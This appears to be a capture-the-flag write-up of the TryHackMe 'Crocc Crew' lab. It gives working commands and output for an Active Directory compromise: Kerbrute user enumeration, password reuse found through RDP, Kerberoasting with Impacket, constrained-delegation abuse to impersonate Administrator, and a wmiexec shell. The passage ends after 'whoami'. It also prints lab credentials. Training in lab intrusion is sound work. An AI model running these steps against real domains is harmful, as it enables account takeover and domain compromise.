### Introduction

In the **Crocc Crew** machine we will learn and put into practice **Active Directory enumeration techniques**, focusing on identifying users, services, and weak configurations within the domain.

During the enumeration process, key services such as **LDAP and Kerberos** will be analyzed, allowing us to identify **Service Principal Names (SPN)** associated with user accounts. From this information, the **Kerberoasting** technique will be applied, which consists of requesting service tickets (TGS) for accounts with configured SPNs and then attempting to crack them offline.

Once valid credentials are obtained, it will be demonstrated how it is possible to perform **impersonation**, including scenarios where a high-privilege account such as the **administrator user** is compromised by abusing misconfigured SPNs.

Finally, the **Pass-the-Ticket (PtT)** technique will be applied, leveraging valid Kerberos tickets to authenticate to the domain without needing the plaintext password, thus achieving lateral movement and privilege escalation within the Active Directory environment.
﻿
﻿Crocc Crew attacks!

You have just gained initial access to a segmented part of the network and only found one device: a domain controller. It looks like it has already been hacked... can you figure out who did it?

![](https://assets.tryhackme.com/additional/imgur/qbQ85Im.png)

### 1. Enumeration

We start by enumerating the victim machine looking for **open ports** on the system, using the **Nmap** tool, with the goal of identifying exposed services and possible attack vectors.

Nmap:

```bash
nmap -p- --open -Pn -n --min-rate 5000 -sS -vvv 10.64.136.123 -oN Scan
```

Output:

```bash
1   │ # Nmap 7.95 scan initiated Fri Dec 12 14:02:43 2025 as: /usr/lib/nmap/nmap -p- --          open -Pn -n --min-rate 5000 -sS -vvv -oN Scan 10.64.136.123
2   │ Nmap scan report for 10.64.136.123
3   │ Host is up, received user-set (0.089s latency).
4   │ Scanned at 2025-12-12 14:02:43 EST for 40s
5   │ Not shown: 65514 filtered tcp ports (no-response)
6   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
7   │ PORT      STATE SERVICE          REASON
8   │ 53/tcp    open  domain           syn-ack ttl 126
9   │ 80/tcp    open  http             syn-ack ttl 126
10  │ 88/tcp    open  kerberos-sec     syn-ack ttl 126
11  │ 135/tcp   open  msrpc            syn-ack ttl 126
12  │ 139/tcp   open  netbios-ssn      syn-ack ttl 126
13  │ 389/tcp   open  ldap             syn-ack ttl 126
14  │ 445/tcp   open  microsoft-ds     syn-ack ttl 126
15  │ 464/tcp   open  kpasswd5         syn-ack ttl 126
16  │ 593/tcp   open  http-rpc-epmap   syn-ack ttl 126
17  │ 636/tcp   open  ldapssl          syn-ack ttl 126
18  │ 3268/tcp  open  globalcatLDAP    syn-ack ttl 126
19  │ 3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
20  │ 3389/tcp  open  ms-wbt-server    syn-ack ttl 126
21  │ 9389/tcp  open  adws             syn-ack ttl 126
22  │ 49666/tcp open  unknown          syn-ack ttl 126
23  │ 49669/tcp open  unknown          syn-ack ttl 126
24  │ 49670/tcp open  unknown          syn-ack ttl 126
25  │ 49671/tcp open  unknown          syn-ack ttl 126
26  │ 49676/tcp open  unknown          syn-ack ttl 126
27  │ 49703/tcp open  unknown          syn-ack ttl 126
28  │ 49714/tcp open  unknown          syn-ack ttl 126
29  │ 
30  │ Read data files from: /usr/share/nmap
31  │ # Nmap done at Fri Dec 12 14:03:23 2025 -- 1 IP address (1 host up) scanned in 39.68 seconds
```

We can see that the system has **several open ports**. Next, we will **filter them** to use **Nmap NSE scripts**, in order to perform deeper enumeration of the exposed services.

**we filter**

```bash
batcat -l java port | sed -n "8,34p" | cut -d"/" -f1 | tr '\n' ',' | sed 's/,$//'

53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49666,49669,49670,49671,49676,49703,49714
```

**nmap NSE script**

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49666,49669,49670,49671,49676,49703,49714 -Pn -n --min-rate 5000 -vvv -sVC 10.64.136.123 -oN Scan_NSE
```

**Output**

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-12 19:22:46Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-12T19:23:35+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-11T19:01:35
| Not valid after:  2026-06-12T19:01:35
| MD5:   414a:f498:6551:37dd:fb0f:a4fd:9e11:d4ce
| SHA-1: a0fa:23a0:c989:e735:fbb0:3357:5663:936b:4360:3849
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQJIeRu7TDwYtBAu6Gi6XYyDANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjUxMjExMTkwMTM1WhcNMjYw
| NjEyMTkwMTM1WjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDIb26MYPlvAJTlO8PZ525N8JUJfWsBVxdo
| f5a7Li24Tbur5gjA3n/pV0y2Dn+64pRPOyb408Wl9iLniywy1F9s1N/XktpO7sk7
| bEudoWTx5nUvVDBzpN+lBygaCoIwwUoRCW2dwXJNm2DdWD+9JCAG1Wk1F19it2fs
| Xm0uRGWWeQZykPK/MdDmxRA71o4DCr370QGmzCS42kTaCzVIRvIFzwiodgeZUwnM
| ju4tGbGdFFpsaINKqf44kvpywOSphtqwxfCfeH2YqNv/ssraVi/+dQQnWJPVeimv
| CXzDbp9X0PZ/UyoQT4E1Sl8kNt+I1Os3OciDVmSjMeix6HB/oJ5lAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAlLEgL9E9dfJyZsomJ8vKVRw2XuGAd+XkQIjI7rekIJEp3q/ST2R9hztN
| MkzHHiBI3YaWgDbTWxeoTcUo59F1sH2db5XOH8jpNaWg9ZaG4Kt7FmqdwWCwLNXH
| BEJ/cf434/zY0DEIezJThoR22TOLP68Ou4TMzeTsY+DjxBTsldqNiM5MabKd/3fh
| MBURz5AsI42LeZ+iyUC7akCkTY/qFbuTbU8xpWYMe0wRh8ItIlinBE4wtTbqu06x
| ugR4gJmvVUJ4eNH2VpGsCNyVon8iwWAZyK8Da6NDl2RLVJxRkx2Kjg4RpiWKTQ7P
| ioLIFIA4lxV3gy4BQ2XCJTUzNJlb/w==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-12T19:24:15+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31305/tcp): CLEAN (Timeout)
|   Check 2 (port 53500/tcp): CLEAN (Timeout)
|   Check 3 (port 25210/udp): CLEAN (Timeout)
|   Check 4 (port 39062/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-12-12T19:23:37
|_  start_date: N/A
```

We can see that the **domain name** of the environment is `DNS_Domain_Name: COOCTUS.CORP`, and that the **host domain name** corresponds to `DNS_Computer_Name: DC.COOCTUS.CORP`.

Both domains are **critical** for correct enumeration and later exploitation of the victim machine, so we proceed to **register them in the `/etc/hosts` file** to ensure proper name resolution during the next phases of the attack.

```bash
nano /etc/hosts

   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 10.64.136.123  DC.COOCRUS.CORP COOCTUS.CORP
   4   │ # The following lines are desirable for IPv6 capable hosts
   5   │ ::1     localhost ip6-localhost ip6-loopback
   6   │ ff02::1 ip6-allnodes
   7   │ ff02::2 ip6-allrouters
```

### 1.2 Enumerating port 80/HTTP

We proceed to **enumerate the identified ports**, starting with **port `80/HTTP`**, with the goal of analyzing the **web application** and detecting **possible attack vectors**.

<img src="/budahacksecurity_static/uploads/md_images/croc/c1.png" style="max-width:100%; border-radius:8px;">

When accessing the **cooctus** website, we observe a message indicating that the site **has been hacked by *crocc new***.

Next, we proceed to review the **`robots.txt`** file, since it defines the paths that search engines can or cannot index, and in many cases reveals **interesting directories** that can be useful during the enumeration phase.

<img src="/budahacksecurity_static/uploads/md_images/croc/c2.png" style="max-width:100%; border-radius:8px;">

We identified **two relevant files**: a **backup of the database connection configuration**, `db-config.bak`, and a suspicious file identified as **`backdoor.php`**.

---

**db-config.bak**

```bash
<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}

echo "Connected Successfully";

?>
```

### **Analysis**

We can see that the `db-config.bak` file corresponds to a **backup file** that contains a **connection configuration to a MySQL database server**.

The code explicitly defines:

* The database server **host** (`db.cooctus.corp`)

* A **user with administrative privileges**

* The **plaintext password**

The connection is made using PHP’s **MySQLi (MySQL Improved)** extension, which is a standard interface for interacting with **MySQL** servers.

---

**Database connection**

```bash
mysql -h db.cooctus.corp -u C00ctusAdm1n -p
Enter password: 

ERROR 2002 (HY000): Can't connect to server on 'db.cooctus.corp' (115)
```

We can see that the **2002 (HY000)** error indicates it was not possible to establish a network connection to the MySQL server. This suggests the database service **is not externally accessible**, either because:

* The MySQL service is **restricted to local connections**

* Port **3306** is blocked by a **firewall**

* There is **network segmentation** limiting access only to the web server or other internal systems

As a result, although valid credentials were identified, it was not possible to directly access the database server from the attacker system.

---

**Backdoor.php**

<img src="/budahacksecurity_static/uploads/md_images/croc/c3.png" style="max-width:100%; border-radius:8px;">

Although the `backdoor.php` file appears to offer a command console, the tests performed show that **it is not possible to execute system commands**, which significantly limits its impact from a direct exploitation standpoint. Given this, we decided to continue enumerating other services and ports in search of additional attack vectors.

---

### 1.3 User Enumeration with Kerbrute

After several hours of enumeration, it was possible to identify **Active Directory** users using the **Kerbrute** tool. This was possible because **port 88/TCP (Kerberos)** was open on the target system.

The presence of this port indicates the domain uses **Kerberos as the primary authentication mechanism**, which enabled enumeration of valid users through ticket-based authentication requests. For this process, a **SecLists username dictionary** was used, specifically **`xato-net-10-million-usernames.txt`**

**Kerbrute**

```bash
❯ kerbrute userenum -d COOCTUS.CORP --dc 10.64.136.123 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 -v -o user.txt
```

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/12/25 - Ronnie Flathers @ropnop

2025/12/12 17:33:34 >  Using KDC(s):
2025/12/12 17:33:34 >  	10.66.190.61:88
2025/12/12 16:33:44 >  [+] VALID USERNAME:	david@COOCTUS.CORP
2025/12/12 16:33:44 >  [+] VALID USERNAME:	steve@COOCTUS.CORP
2025/12/12 16:33:44 >  [+] VALID USERNAME:	mark@COOCTUS.CORP
2025/12/12 16:33:44 >  [+] VALID USERNAME:	jeff@COOCTUS.CORP
2025/12/12 16:33:44 >  [+] VALID USERNAME:	kevin@COOCTUS.CORP
2025/12/12 16:33:44 >  [+] VALID USERNAME:	howard@COOCTUS.CORP
2025/12/12 16:33:45 >  [+] VALID USERNAME:	David@COOCTUS.CORP
2025/12/12 16:33:45 >  [+] VALID USERNAME:	Steve@COOCTUS.CORP
2025/12/12 16:33:45 >  [+] VALID USERNAME:	ben@COOCTUS.CORP
2025/12/12 16:33:45 >  [+] VALID USERNAME:	karen@COOCTUS.CORP
2025/12/12 16:33:46 >  [+] VALID USERNAME:	evan@COOCTUS.CORP
2025/12/12 16:33:47 >  [+] VALID USERNAME:	Mark@COOCTUS.CORP
2025/12/12 16:33:48 >  [+] VALID USERNAME:	administrator@COOCTUS.CORP
2025/12/12 16:33:48 >  [+] VALID USERNAME:	Howard@COOCTUS.CORP
2025/12/12 16:33:48 >  [+] VALID USERNAME:	Kevin@COOCTUS.CORP
2025/12/12 16:33:48 >  [+] VALID USERNAME:	jon@COOCTUS.CORP
2025/12/12 16:33:48 >  [+] VALID USERNAME:	STEVE@COOCTUS.CORP
2025/12/12 16:33:50 >  [+] VALID USERNAME:	Jeff@COOCTUS.CORP
2025/12/12 16:33:52 >  [+] VALID USERNAME:	DAVID@COOCTUS.CORP
2025/12/12 16:33:54 >  [+] VALID USERNAME:	Karen@COOCTUS.CORP
2025/12/12 16:33:59 >  [+] VALID USERNAME:	MARK@COOCTUS.CORP
2025/12/12 16:34:00 >  [+] VALID USERNAME:	JEFF@COOCTUS.CORP
2025/12/12 16:34:08 >  [+] VALID USERNAME:	Jon@COOCTUS.CORP
2025/12/12 16:34:10 >  [+] VALID USERNAME:	KEVIN@COOCTUS.CORP
2025/12/12 16:34:10 >  [+] VALID USERNAME:	Ben@COOCTUS.CORP
2025/12/12 16:34:14 >  [+] VALID USERNAME:	Administrator@COOCTUS.CORP
2025/12/12 16:34:25 >  [+] VALID USERNAME:	HOWARD@COOCTUS.CORP
2025/12/12 16:34:25 >  [+] VALID USERNAME:	BEN@COOCTUS.CORP
2025/12/12 16:34:44 >  [+] VALID USERNAME:	Evan@COOCTUS.CORP
2025/12/12 16:34:46 >  [+] VALID USERNAME:	spooks@COOCTUS.CORP
2025/12/12 16:34:55 >  [+] VALID USERNAME:	JON@COOCTUS.CORP
2025/12/12 16:35:36 >  [+] VALID USERNAME:	fawaz@COOCTUS.CORP
2025/12/12 16:35:47 >  [+] VALID USERNAME:	visitor@COOCTUS.CORP
2025/12/12 16:36:20 >  [+] VALID USERNAME:	KAREN@COOCTUS.CORP
2025/12/12 16:36:43 >  [+] VALID USERNAME:	pars@COOCTUS.CORP
2025/12/12 16:40:30 >  [+] VALID USERNAME:	EVAN@COOCTUS.CORP
```

```
batcat -l java user.txt | grep "VALID USERNAME" | cut -d":" -f4 > user_valid.txt

	david@COOCTUS.CORP
	steve@COOCTUS.CORP
	mark@COOCTUS.CORP
	jeff@COOCTUS.CORP
	kevin@COOCTUS.CORP
	howard@COOCTUS.CORP
	David@COOCTUS.CORP
	Steve@COOCTUS.CORP
	ben@COOCTUS.CORP
	karen@COOCTUS.CORP
	evan@COOCTUS.CORP
	Mark@COOCTUS.CORP
	administrator@COOCTUS.CORP
	Howard@COOCTUS.CORP
	Kevin@COOCTUS.CORP
	jon@COOCTUS.CORP
	STEVE@COOCTUS.CORP
	Jeff@COOCTUS.CORP
	DAVID@COOCTUS.CORP
	Karen@COOCTUS.CORP
	MARK@COOCTUS.CORP
	JEFF@COOCTUS.CORP
	Jon@COOCTUS.CORP
	KEVIN@COOCTUS.CORP
	Ben@COOCTUS.CORP
	Administrator@COOCTUS.CORP
	HOWARD@COOCTUS.CORP
	BEN@COOCTUS.CORP
	Evan@COOCTUS.CORP
	spooks@COOCTUS.CORP
	JON@COOCTUS.CORP
	fawaz@COOCTUS.CORP
	visitor@COOCTUS.CORP
	KAREN@COOCTUS.CORP
	pars@COOCTUS.CORP
	EVAN@COOCTUS.CORP

```

Now that we have a list of valid **Active Directory** users, we proceed to apply the **password spraying** technique but it did not work.

---

Later, we attempted to establish an **RDP connection without providing credentials** in order to identify possible **information leaks** or insecure service configurations.

For this, we used the **rdesktop** tool, which can reveal relevant information during the authentication process, even if the connection is not successful.

```bash
rdesktop -f -u "" 10.66.190.61
```

<img src="/budahacksecurity_static/uploads/md_images/croc/c4.png" style="max-width:100%; border-radius:8px;">

During the unauthenticated RDP connection, it was possible to see in the background of the system an **informational label** containing the text **`Visitor GuestLogin!`**.

Considering that during the **user enumeration phase** a user account named **`visitor`** had been identified, we hypothesized that the observed text could correspond to a **reused or weak password** associated with that user.

To verify this, we tested the credentials using **CrackMapExec**.

```
crackmapexec smb 10.66.190.61 -u visitor -p 'GuestLogin!' 

SMB         10.66.190.61    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.66.190.61    445    DC               [+] COOCTUS.CORP\visitor:GuestLogin! 
```

Now that we have valid access as the **`visitor`** user, we proceed to **enumerate the shared resources (SMB shares)** available on the target system.

```

 smbmap -H 10.66.190.61 -u visitor -p 'GuestLogin!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.66.190.61:445	Name: DC.COOCTUS.CORP     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Home                                              	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

When enumerating the shares with **`smbmap`**, we identified that the **`visitor`** user has access to a shared folder named **`Home`**.
Since access is allowed, we proceed to **verify the contents of that share** to identify files or directories of interest.

```bash

smbmap -H 10.66.190.61 -u visitor -p 'GuestLogin!' -r "Home"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.66.190.61:445	Name: DC.COOCTUS.CORP     	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Home                                              	READ ONLY	
	./Home
	dr--r--r--                0 Tue Jun  8 14:42:53 2021	.
	dr--r--r--                0 Tue Jun  8 14:42:53 2021	..
	fr--r--r--               17 Tue Jun  8 14:41:45 2021	user.txt
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
```

During enumeration of the **`Home`** share, we identified the file **`user.txt`**, which could contain sensitive information or a system flag.
To access this file, we authenticated using **`smbclient`** with the valid credentials of the **`visitor`** user.

```bash
smbclient //10.66.190.61/Home -U visitor
Password for [WORKGROUP\visitor]:
Try "help" to get a list of possible commands.
smb: \> get user.txt 
getting file \user.txt of size 17 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

We found the first flag --> THM{Gu3st_Pl3as3}

---

### 1.4 Privileged user enumeration

With the valid credentials of the **`visitor`** user, we used the **`windapsearch`** tool to enumerate **privileged users within the domain**.

```bash

./windapsearch.py --dc-ip 10.66.190.61 -u visitor@COOCTUS.CORP -p GuestLogin! -PU 
[+] Using Domain Controller at: 10.66.190.61
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=COOCTUS,DC=CORP
[+] Attempting bind
[+]	...success! Binded as: 
[+]	u:COOCTUS\Visitor
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 3 nested users for group Domain Admins:

cn: Administrator

cn: Mark
userPrincipalName: mark@COOCTUS.CORP

cn: Jeff
userPrincipalName: Jeff@COOCTUS.CORP

[+] Using DN: CN=Domain-Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domain-Admins:

[+] Using DN: CN=Domain Administrators,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domain Administrators:

[+] Using DN: CN=Domain-Administrators,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domain-Administrators:

[+] Using DN: CN=Domänen Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domänen Admins:

[+] Using DN: CN=Domänen-Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domänen-Admins:

[+] Using DN: CN=Domain Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 3 nested users for group Domain Admins:

cn: Administrator

cn: Mark
userPrincipalName: mark@COOCTUS.CORP

cn: Jeff
userPrincipalName: Jeff@COOCTUS.CORP

[+] Using DN: CN=Domain-Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domain-Admins:

[+] Using DN: CN=Domänen Administratoren,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domänen Administratoren:

[+] Using DN: CN=Domänen-Administratoren,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Domänen-Administratoren:

[+] Using DN: CN=Administrators,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Administrators:

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 5 nested users for group Enterprise Admins:

cn: Administrator

cn: Spooks
userPrincipalName: Spooks@COOCTUS.CORP

cn: Steve
userPrincipalName: Steve@COOCTUS.CORP

cn: Howard
userPrincipalName: Howard@COOCTUS.CORP

cn: admCroccCrew
userPrincipalName: admCroccCrew@COOCTUS.CORP

[+] Using DN: CN=Schema Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 1 nested users for group Schema Admins:

cn: Administrator

[+] Using DN: CN=Account Operators,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Account Operators:

[+] Using DN: CN=Backup Operators,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Backup Operators:

[+] Using DN: CN=Server Management,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Server Management:

[+] Using DN: CN=Konten-Operatoren,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Konten-Operatoren:

[+] Using DN: CN=Sicherungs-Operatoren,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Sicherungs-Operatoren:

[+] Using DN: CN=Server-Operatoren,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Server-Operatoren:

[+] Using DN: CN=Schema-Admins,CN=Users,DC=COOCTUS,DC=CORP
[+]	Found 0 nested users for group Schema-Admins:


[*] Bye!
                                                                              

```

During privileged user enumeration via LDAP, we identified the account:

```bash
cn: admCroccCrew userPrincipalName: admCroccCrew@COOCTUS.CORP
```

This account is part of the **Enterprise Admins** group, granting it **maximum privileges at the domain and forest level**.

---

### **SPN Search**

Using the *windapsearch* tool with the `--user-spns` option, we identified that only the **password-reset** account, located in the *Service-Accounts* OU, has a *Service Principal Name (SPN)* configured. This finding confirms that this service account is vulnerable to **Kerberoasting** attacks, especially considering that its password does not expire, making it a critical target for credential harvesting and a possible privilege escalation within the domain.

```bash
./windapsearch.py --dc-ip 10.66.190.61 -u visitor@COOCTUS.CORP -p GuestLogin! --user-spns

[+] Using Domain Controller at: 10.66.190.61
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=COOCTUS,DC=CORP
[+] Attempting bind
[+]	...success! Binded as: 
[+]	u:COOCTUS\Visitor
[+] Attempting to enumerate all User objects with SPNs
[+]	Found 1 Users with SPNs:

CN=reset,OU=Service-Accounts,DC=COOCTUS,DC=CORP
```

Once it was confirmed that the **password-reset** account has a configured *Service Principal Name (SPN)*, we used the **GetUserSPNs.py** tool from *Impacket* to request the associated Kerberos ticket and obtain the hash required to perform a Kerberoasting attack.

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py COOCTUS.CORP/visitor:GuestLogin! -dc-ip 10.65.146.94 -request
```

<img src="/budahacksecurity_static/uploads/md_images/croc/c5.png" style="max-width:100%; border-radius:8px;">

With the obtained Kerberos hash, we used **John the Ripper** to crack the password of the **password-reset** account, taking advantage of the fact that the process is performed offline without generating additional traffic in the domain.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)     
```

### **Kerberos Delegation previously identified**

Previously, during LDAP enumeration using the **ldapsearch** tool, we identified that the **oakley** account has constrained Kerberos delegation configured through the *msDS-AllowedToDelegateTo* attribute.

This configuration indicates that the **oakley** account is authorized to impersonate other users, including privileged users such as administrators, when requesting Kerberos (*TGS*) tickets for specific services on the domain controller.

```bash
grep -i "msDS-AllowedToDelegateTo" crocc.txt                                                       
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP
msDS-AllowedToDelegateTo: oakley/DC
msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP/COOCTUS
msDS-AllowedToDelegateTo: oakley/DC/COOCTUS
```

We used the **getST.py** tool to impersonate the **Administrator** user and obtain a valid Kerberos ticket.

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.65.146.94 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

Once the Kerberos ticket was obtained, it was exported into the **KRB5CCNAME** environment variable, allowing Kerberos-compatible tools to use that ticket to authenticate without needing additional credentials.

```bash
export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

We used **klist** to confirm that the Kerberos ticket was exported correctly.

```bash
klist

Ticket cache: FILE:Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
Default principal: Administrator@COOCTUS.CORP

Valid starting     Expires            Service principal
12/12/25 20:10:59  13/12/25 06:10:58  oakley/DC.COOCTUS.CORP@COOCTUS.CORP
	renew until 13/12/25 20:10:53
```

### **System access using Kerberos**

Finally, we used the **impacket-wmiexec** tool to authenticate to the system using the previously obtained Kerberos ticket, achieving remote access with administrator privileges without needing to provide additional credentials.

```bash
 impacket-wmiexec -k DC.COOCTUS.CORP
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
